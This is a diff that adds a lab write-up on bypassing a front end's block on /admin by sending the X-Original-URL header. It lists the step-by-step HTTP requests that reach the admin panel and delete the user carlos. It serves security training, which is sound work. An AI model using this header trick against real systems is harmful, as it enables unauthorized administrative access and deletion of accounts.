@@ -1,0 +1,39 @@
+Lab: URL-based access control can be circumvented
+
+Vulnerability: This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. 
+                However, the back-end application is built on a framework that supports the X-Original-URL header.
+
+Goal: To solve the lab, access the admin panel and delete the user carlos.
+
+Analysis and Solution: 
+1. Access /admin URL, and receive an error: 
+    HTTP/2 403 Forbidden
+    Content-Type: application/json; charset=utf-8
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 15
+
+    "Access denied"
+
+2. Using Burp Suite, modify the GET /admin request with adding X-Original-URL:
+    GET / HTTP/2
+    X-Original-Url: /admin
+
+=> Now we can access /admin URL: 
+    /admin/delete?username=carlos => to delete carlos
+    /admin/delete?username=wiener => to delete wiener
+
+3. Make a request:
+    GET /admin/delete?username=carlos
+
+=> Receive an error: "Access denied"
+=> It is also blocked
+
+4. Using Burp Suite, modify this request using X-Original-URL:
+    GET / HTTP/2
+    X-Original-Url: /admin/delete?username=carlos
+=> Receive an error: "Missing paramerter username"
+
+5. Modify the request by adding a parameter username
+    GET /?username=carlos HTTP/2
+    X-Original-Url: /admin/delete?username=carlos
+=> SUCCESSFULLY 
